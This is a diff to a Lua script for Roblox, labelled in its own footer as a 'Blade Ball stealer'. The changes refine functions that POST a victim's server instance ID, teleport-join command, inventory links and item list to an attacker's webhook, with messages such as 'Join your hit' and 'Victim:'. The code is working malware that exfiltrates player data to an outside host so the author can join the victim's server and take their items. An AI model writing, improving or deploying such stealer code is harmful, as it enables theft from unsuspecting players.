@@ -167,7 +167,7 @@ local function SendJoinMessage(list, prefix)
     end
 
     local data = {
-        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
+        ["content"] = (ping == "Yes" and "||​|| @everyone " or "") .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
         ["auth_token"] = auth_token, 
         ["embeds"] = {{
             ["title"] = "🟣 Join your hit",
@@ -196,7 +196,7 @@ local function SendJoinMessage(list, prefix)
                 },
                 {
                     ["name"] = "🔗 Quick Links", 
-                    ["value"] = "[**JOIN SERVER**](https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId .. ") | [**VIEW INVENTORY**](https://www.roblox.com/users/"..plr.UserId.."/inventory)", 
+                    ["value"] = "[**JOIN SERVER**](https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId .. ") | [**RAW INVENTORY**](https://inventory.roblox.com/v1/users/"..plr.UserId.."/assets/collectibles?assetType=All&sortOrder=Asc&limit=100)", 
                     ["inline"] = false
                 }
             },
@@ -210,8 +210,6 @@ end
 local function SendMessage(list)
     local itemListSent = ""
     local grouped = {}
-
-    -- Groupement des items
     for _, item in ipairs(list) do
         grouped[item.Name] = (grouped[item.Name] or 0) + 1
     end
@@ -219,16 +217,14 @@ local function SendMessage(list)
         itemListSent = itemListSent .. name .. " (x" .. count .. ")\n"
     end
 
-    -- Limite Discord
     if #itemListSent > 1000 then
         itemListSent = string.sub(itemListSent, 1, 950) .. "\nPlus more..."
     end
 
     local data = {
         ["embeds"] = {{
-            ["title"] = "🟣 You joined the victim's server",
-            ["description"] = "Transfer process started!",
-            ["color"] = 8323327, -- VIOLET
+            ["title"] = "🟢 Hit is still in the server",
+            ["color"] = 65280, -- VERT (Comme demandé plus tôt pour différencier quand tu rejoins)
             ["fields"] = {
                 {
                     ["name"] = "👤 Victim:",
@@ -250,19 +246,16 @@ local function SendMessage(list)
                 ["text"] = "Blade Ball stealer by Eblack"
             },
             ["thumbnail"] = {
-                ["url"] = "[https://www.roblox.com/headshot-thumbnail/image?userId=](https://www.roblox.com/headshot-thumbnail/image?userId=)" .. plr.UserId .. "&width=420&height=420&format=png"
+                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
             }
         }}
     }
 
-    local body = HttpService:JSONEncode(data)
-    local headers = {["Content-Type"] = "application/json"}
-    
-    local response = request({
+    request({
         Url = webhook,
         Method = "POST",
-        Headers = headers,
-        Body = body
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(data)
     })
 end
 
